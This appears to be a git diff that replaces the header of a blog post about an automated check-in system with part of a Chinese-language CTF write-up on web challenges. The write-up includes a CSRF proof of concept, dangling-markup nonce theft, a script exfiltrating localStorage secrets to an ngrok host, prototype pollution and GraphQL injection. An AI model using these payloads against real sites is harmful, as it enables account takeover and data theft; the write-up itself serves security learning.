@@ -1,17 +1,229 @@
----
-title: 'AWS Lambda + GitHub API + Google Sheet = 自動化簽到系統'
-date: 2018-09-14 22:10
-tags: [Back-end]
-categories:
-  - Back-end
----
+裡面有一個部分是用 web worker 來繞過對 `window.location.href` 以及 `document.domain` 的檢查，像是這樣：
 
-## 前言
+``` js
+// worker.js
 
-這一年間我利用閒暇之餘嘗試進行了幾場[教學實驗](https://medium.com/hulis-blog/mentor-program-s2-f876c4e13d3b)，希望能透過持續的教學改進自己的教材，從學生的反饋當中得到一些心得。
+window = {}
+window.location = {}
+document = {}
 
-而在進行這些教學實驗的時候，我常常在想可以透過哪些現成的服務減少我的負擔，畢竟身為工程師嘛，很想把一些瑣碎的事務自動化，長期下來可以節省的時間是很可觀的。
+// send the secret to top window!
+window.saveSecret = function(msg){  
+  self.postMessage(msg)  
+}
 
-半年前有了第一次嘗試，也在這邊分享了心得：[利用 Github Classroom 加 Travis CI 打造改作業系統](https://blog.techbridge.cc/2018/02/03/github-classroom-and-travis-ci/)，有了自動改作業系統以後，確實省下不少麻煩。
+window.location.href = "https://challenge-1022.intigriti.io/challenge/create";
+document.domain = "challenge-1022.intigriti.io";
 
-這次要來分享的是兩週前用大概一兩天的時間快速實作出來的自動化簽到系統。
+// we can use importScripts function from API to import external scripts!
+importScripts("https://challenge-1022.intigriti.io/challenge/getSecret.js");
+```
+
+所以這題特別檢查 context 應該是想把這個擋住，但幸好當時在研究 Intigriti 這個的時候，我發現 `document.domain` 其實可以自己用 `Object.defineProperty` 硬蓋過去，所以這樣就可以 CSRF：
+
+``` html
+<script>
+  Object.defineProperty(document, 'domain', {
+    value: '35.200.57.143'
+  })
+</script>
+<input id="_csrf" />
+<script src="https://35.200.57.143:11004/getSettings.js"></script>
+<form id=f method=POST action="https://35.200.57.143:11004/profile" target="_blank">
+  <input name="name" value="poc">
+  <input name="csrf" value="">
+</form>
+
+<script>
+  const csrf = _csrf.value
+  f.csrf.value = csrf
+  f.submit()
+</script>
+```
+
+再來就是要偷 nonce 了，這題用的瀏覽器是 Firefox，對於 [Dangling Markup Injection](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection) 似乎沒做什麼防護，可以用 meta redirect 偷到下面的內容：`<meta http-equiv=refresh content='0; url=http://43d1-ip.ngrok.io/steal?q=`
+
+最後一步就是要阻止 `csp.gif` 的載入，因為只要這個被載入的話，nonce 就會改變，我花了一個半小時找尋怎麼把它擋掉，原本想說應該可以靠之前提過的 concurrent limit 來防止，但怎麼弄都不成功。
+
+最後發現原本 `base-uri` 是 `self`，所以 base 是可以用的，那就用 base 就好了，浪費了一小時 QQ
+
+``` html
+<script>
+  Object.defineProperty(document, 'domain', {
+    value: '35.200.57.143'
+  })
+</script>
+<input id="_csrf" />
+<script src="https://35.200.57.143:11004/getSettings.js"></script>
+<form id=f method=POST action="https://35.200.57.143:11004/profile" target="test">
+  <input name="name" value="poc">
+  <input name="csrf" value="">
+</form>
+
+<script>
+  var win = window.open('https://35.200.57.143:11004/profile', 'test')
+  fetch('/clear')
+  stealNoncePayload = "<base href='https://35.200.57.143:11004/abc/def/'><meta http-equiv=refresh content='0; url=http://43d1-ip.ngrok.io/steal?q="
+  const csrf = _csrf.value
+  f.csrf.value = csrf
+  f.name.value = stealNoncePayload
+  
+  setTimeout(() => {
+    f.submit()
+  }, 500)
+  
+
+  function poll() {
+    fetch('/nonce')
+      .then(res => res.text())
+      .then(nonce => {
+          if (!nonce) {
+            return setTimeout(poll, 100)
+          }
+          f.name.value = `<script nonce=${nonce}>
+            location = 'http://43d1-ip.ngrok.io?q='+localStorage.getItem('secret')
+          <\/script>`
+          f.submit()
+      })
+  }
+  poll()
+
+</script>
+```
+
+## Momomomomemomemo (3 solves)
+
+這題隊友解出來的，也滿有趣的，總之就是前端會根據你提供的 id 用 GraphQL 去抓結果：
+
+``` js
+memo(id) {
+    const query = `query { 
+        memo (
+            id: "${id}", 
+            token: "${this.token}") {
+                content
+            } 
+        }`;
+    return this.#query(query);
+}
+```
+
+在最後 query 的部分是使用了 [persisted queries](https://www.apollographql.com/docs/apollo-server/performance/apq/)，以前有聽過，大概就是你先送 query 的 hash 出去，如果以前就有執行過的話，會直接送結果回來。
+
+反之若是沒有，你就再送一次 hash + query，讓後端去 cache 結果，而前端的實作是這樣：
+
+``` js
+async #query(query) {
+    const hash = await this.#getQueryHash(query);
+    const res = await fetch(
+        this.endpoint +
+            "?" +
+            new URLSearchParams({
+                extensions: JSON.stringify({
+                    persistedQuery: { version: 1, sha256Hash: hash },
+                }),
+            }),
+        {
+            headers: { "Content-type": "application/json" },
+        }
+    );
+    const data = await res.clone().json();
+    if (data.errors) {
+        if (data.errors[0].extensions.code == "PERSISTED_QUERY_NOT_FOUND") {
+            return await fetch(this.endpoint, {
+                method: "POST",
+                headers: { "Content-type": "application/json" },
+                body: JSON.stringify({
+                    query,
+                    extensions: {
+                        persistedQuery: {
+                            version: 1,
+                            sha256Hash: hash,
+                        },
+                    },
+                }),
+            });
+        }
+    }
+    return res;
+}
+```
+
+這邊前端也用了 Purl 這個 lib，所以一樣有 prototype pollution 可以用，但這題可以污染什麼呢？答案在底下這一段裡面：
+
+``` js
+const purl = window.purl
+
+const memoId = purl().param('id')
+
+const gql = new GraphQL(location.origin)
+
+class GraphQL {
+    constructor(host, option = {}) {
+        this.endpoint = host + "/";
+        this.endpoint += option.path || "graphql";
+    }
+    // ...
+}
+```
+
+你可以污染 path，就能操控 `option.path`，但操控這個可以做什麼？這就跟後端的 i18n 邏輯有關了，實作如下：
+
+``` js
+// simple i18n
+app.use(function (req, res, next) {
+    let origPath = req.originalUrl.split('?')[0]
+    let origParam = req.originalUrl.split('?')[1]
+    let langPath = 'en/'
+    
+  
+    if (origPath.match(/((\/en\/?)|(\/ja\/?))$/) || origPath.match(/^(\/static\/|\/graphql\/?|\/favicon.ico\/?)/)) {
+      next()
+    } else {
+      if (req.headers['accept-language'] && req.headers['accept-language'].split(',')[0] === 'ja') langPath = 'ja/'
+      res.redirect(origPath + (origPath.endsWith('/') ? '' : '/') + langPath + (origParam ? '?' + origParam : ''))
+    }
+  })
+```
+
+要注意的是 `req.originalUrl` 只會有 path 的部分，所以像 http://chall:11005/abc 的話，originalUrl 就會是 `/abc`。
+
+靠著上面操控的 path，我們可以把 path 污染成 `/huli.tw/`，這樣送出的 URL 就是：`http://34.85.126.119:11005//huli.tw/?extensions=...`，到了後端的 redirect 邏輯，最後就會被導到 `//huli.tw/en/?extension=...`。
+
+如此一來，就可以靠著 prototype pollution 把 request 導到自己的 server，拿到 query string。
+
+這題的目的是要偷 admin 的 memo，可是我們並不知道 admin memo id，要怎麼辦呢？
+
+仔細看這一段：
+
+``` js
+memo(id) {
+    const query = `query { 
+        memo (
+            id: "${id}", 
+            token: "${this.token}") {
+                content
+            } 
+        }`;
+    return this.#query(query);
+}
+```
+
+我們可以精心構造一個 id 達成 GraphQL injection，像這樣：
+
+``` js
+query { 
+  memo (
+    id: "a", token: "b"
+  ) { content }
+
+  memo2: memos(
+    token: "${this.token}") {
+        content
+    } 
+}
+```
+
+這樣就變成了兩個 query，原本應該是 memo 的 token 變成了 memos 的 token，就可以拿到所有 admin 的 note。
+
+因此，最後的解法就是先送一次這個改造過的 query，讓 server 把結果存起來，再加上 prototype pollution，讓 request 導到我們的 server，就可以知道 hash 是多少，就能拿到結果。
